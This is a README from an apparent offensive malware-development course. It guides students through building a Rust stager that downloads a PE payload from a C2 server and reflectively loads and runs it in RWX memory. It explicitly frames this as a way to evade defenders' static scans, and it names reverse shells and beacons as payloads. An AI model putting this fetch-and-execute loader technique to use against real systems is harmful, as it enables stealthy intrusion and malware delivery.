# Module 26 — Staged Payloads

## Concept

Every module so far has embedded its payload at compile time — either as raw shellcode bytes, a DLL, or a hollow PE. This works, but it means the full malicious payload is always present in the loader binary. Static analysis of the loader reveals the payload.

**Staging** separates the loader (stager) from the payload (stage two):

```
[stager on disk]  ─── HTTP GET ───►  [C2 server]
                  ◄── stage_two.exe ──
       │
       ▼
[allocate RWX in own process]
[copy PE headers + sections]
[apply relocations]
[jump to entry point]
       │
       ▼
[calc.exe / reverse shell / beacon — running in stager's address space]
```

The stager binary contains **no payload**. The payload lives on the server and is downloaded fresh at runtime. The stager is a generic loader — it fetches any PE from the configured URL. Defenders scanning the stager file see nothing malicious.

### How this differs from Module 04 (hollowing)

| Property | Module 04 hollowing | Module 26 staging |
|---|---|---|
| Payload location | Embedded in the loader EXE | Downloaded at runtime from C2 |
| Target process | A remote process (`notepad.exe`) | Own process (stager IS the host) |
| PE loading | Write into remote process via `WriteProcessMemory` | `VirtualAlloc` locally + `copy_nonoverlapping` |
| Relocation target | Remote process address space | Local address space |
| Entry point invocation | `SetThreadContext` + `ResumeThread` | Direct function pointer call |

### How this relates to Module 07 (reflective loading)

Module 07 implemented a reflective loader inside a DLL — the DLL mapped itself. Here you implement the same PE mapping algorithm (DOS header → NT headers → sections → relocations → entry point) but in a standalone stager, loading an arbitrary downloaded PE. The mechanics are identical; the source of the bytes differs.

---

## This module has two crates

| Crate | Output | Role |
|---|---|---|
| `26-stage-two` | `stage_two_payload.exe` | Payload — the PE that the stager downloads and runs |
| `26-staged-payloads` | `staged-payloads.exe` | Stager — downloads and reflectively executes the payload |

**Build and test order:**

```bash
# 1. Build the stage-two payload
cargo build --target x86_64-pc-windows-gnu -p stage-two-payload

# 2. Serve it over HTTP from the build output directory
#    (on Linux host or in the VM)
cd target/x86_64-pc-windows-gnu/debug/
python3 -m http.server 8080

# 3. Build the stager (in a separate terminal)
cargo build --target x86_64-pc-windows-gnu -p staged-payloads

# 4. Copy staged-payloads.exe to the VM and run it
```

The stager downloads `stage_two_payload.exe` from `http://127.0.0.1:8080/stage_two_payload.exe`, maps it in memory, and executes it. You should see `calc.exe` appear.

---

## Task — Stager (`26-staged-payloads/src/main.rs`)

Implement the stager in seven steps. The PE loading steps (3–6) are the same algorithm you used in Module 04 and Module 07 — use those READMEs as reference.

### Step 1 — Download the stage-two PE

Re-use or re-implement `http_get(host, port, path) -> Vec<u8>` from Module 25. The function issues a `GET` request and returns the response body as raw bytes. The skeleton includes the helper `to_wide_null` and stub signatures — see Module 25 for the full WinHttp call sequence.

This is the only step that differs from a local PE loader: the source of bytes is the network, not `include_bytes!` or a file on disk.

### Step 2 — Parse the PE headers locally

The downloaded `Vec<u8>` is a valid PE file. Navigate it with the same raw pointer casts as Modules 04 and 07:

```
IMAGE_DOS_HEADER at pe_bytes.as_ptr()
    └─ e_lfanew → byte offset to IMAGE_NT_HEADERS64
         ├─ FileHeader.NumberOfSections
         └─ OptionalHeader
              ├─ ImageBase          (preferred load address)
              ├─ SizeOfImage        (total bytes to allocate)
              ├─ SizeOfHeaders      (header bytes to copy first)
              ├─ AddressOfEntryPoint (RVA of the entry point function)
              └─ DataDirectory[5]   (base relocation table — VirtualAddress + Size)
```

Section headers begin at `nt_ptr + size_of::<IMAGE_NT_HEADERS64>()`. Each `IMAGE_SECTION_HEADER` has `VirtualAddress` (RVA in the mapped image) and `PointerToRawData` / `SizeOfRawData` (position in the raw file bytes).

### Step 3 — Allocate RWX memory

```
VirtualAlloc(
    lpaddress: Option<*const c_void>,          // Some(preferred_base as *const c_void) — try the payload's preferred address
    dwsize: usize,                             // SizeOfImage — total mapped size
    flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
    flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_EXECUTE_READWRITE — needs all three while you build the image
) -> *mut c_void                               // null on failure; check it
```

The returned `alloc_base` may differ from `preferred_base`. If it does, you must apply base relocations in step 6.

### Step 4 — Copy PE headers

```rust
std::ptr::copy_nonoverlapping(
    pe_bytes.as_ptr(),  // source: start of the raw PE bytes
    alloc_base,         // destination: start of the RWX allocation
    header_size,        // SizeOfHeaders bytes
);
```

### Step 5 — Copy each section's raw data

For each section header (index `i` in `0..num_sections`):

```
src = pe_bytes.as_ptr() + section.PointerToRawData   (file offset into raw bytes)
dst = alloc_base         + section.VirtualAddress     (RVA offset in mapped image)
len = section.SizeOfRawData
```

Use `copy_nonoverlapping(src, dst, len)` for each section.

### Step 6 — Apply base relocations (if needed)

If `alloc_base as usize != preferred_base`, every hardcoded absolute address in the PE image is wrong by `delta = alloc_base as isize - preferred_base as isize`. The `.reloc` section (DataDirectory[5]) records every address that needs fixing.

The relocation data is a sequence of `IMAGE_BASE_RELOCATION` blocks:

```
IMAGE_BASE_RELOCATION {
    VirtualAddress: u32,  // RVA of the 4 KB page this block covers
    SizeOfBlock:    u32,  // total byte size including this 8-byte header
    // followed by (SizeOfBlock - 8) / 2  entries of type u16:
    //   top 4 bits  = type  (0xA = DIR64 — an 8-byte absolute address; 0 = padding, skip)
    //   bottom 12 bits = byte offset within the page
}
```

For each DIR64 entry at page offset `off`:
- address in the mapped image: `alloc_base + block.VirtualAddress + off`
- read the 8-byte value at that address, add `delta`, write it back

Use raw pointer reads and writes. Only enter the loop if `delta != 0`. See Module 04 step 8 for a more detailed walkthrough of the relocation algorithm.

### Step 7 — Call the entry point

Transmute the entry point address to a function pointer and call it:

```
Hint: let ep_addr = alloc_base as usize + entry_rva;
      let ep: unsafe extern "system" fn() = mem::transmute(ep_addr);
      ep();
```

`extern "system"` is the Windows calling convention. On x64 it is the same as `extern "C"` but being explicit is correct. After `ep()` returns (or never returns, depending on the payload), the stager is done.

---

## PE layout recap

```
[alloc_base]
├── PE headers                     (SizeOfHeaders bytes)
├── [section 0 at VirtualAddress]  (SizeOfRawData bytes from PointerToRawData)
├── [section 1 at VirtualAddress]
│   ...
└── [section N at VirtualAddress]
```

RVAs (relative virtual addresses) are always offsets from `alloc_base` in the **mapped** image. `PointerToRawData` is an offset in the **file** bytes. Don't mix the two up — this is the most common bug in PE loaders.

---

## Acceptance Criteria

- [ ] `cargo build --target x86_64-pc-windows-gnu -p stage-two-payload` succeeds
- [ ] `cargo build --target x86_64-pc-windows-gnu -p staged-payloads` succeeds
- [ ] Only `staged-payloads.exe` goes to the VM (stage-two stays on the server)
- [ ] Running `staged-payloads.exe` with the HTTP server running causes `calc.exe` to appear
- [ ] If the server is unreachable, `http_get` returns an empty `Vec` and the `assert!` fires with a clear message (don't silently proceed with zero bytes)
- [ ] `VirtualAlloc` null return is detected and panics
- [ ] Relocations are applied when `alloc_base != preferred_base`
- [ ] The `copy_nonoverlapping` for each section uses `PointerToRawData` (file offset) as source and `VirtualAddress` (RVA) as destination — not swapped

---

## Hints

- The `http_get` implementation here is identical to Module 25. Copy or re-implement it — the same WinHttp sequence works.
- The PE mapping steps (4–7) are almost identical to Module 04 steps 5–8 and Module 07. If you're stuck, re-read those READMEs.
- `VirtualAlloc` (without `Ex`) allocates in the **current** process — no `hProcess` argument. This is the key difference from Module 04 which allocated in a remote process via `VirtualAllocEx`.
- `DataDirectory[5].Size == 0` means no relocations — the PE was compiled without ASLR (`/FIXED`). In that case, `alloc_base` must equal `preferred_base` or the load will likely crash.
- Watch out for section padding: `SizeOfRawData` in the file may be smaller than `VirtualSize` in the mapped image. The remaining bytes should be zero, which `VirtualAlloc` already guarantees (OS zeroes committed pages).
- After `ep()` returns, the stage-two payload has finished. The stager process then exits normally.

---

## Submission

Paste `26-staged-payloads/src/main.rs` and ask for a review.
